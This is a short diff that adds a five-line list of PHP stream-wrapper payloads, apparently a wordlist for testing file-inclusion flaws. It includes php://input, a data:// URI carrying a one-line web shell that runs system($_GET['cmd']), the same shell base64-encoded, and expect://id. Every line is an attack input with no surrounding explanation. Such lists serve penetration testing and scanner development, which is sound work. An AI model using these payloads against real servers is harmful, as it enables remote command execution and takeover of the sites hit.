@@ -1,0 +1,5 @@
+php://input
+php://stdin
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+expect://id
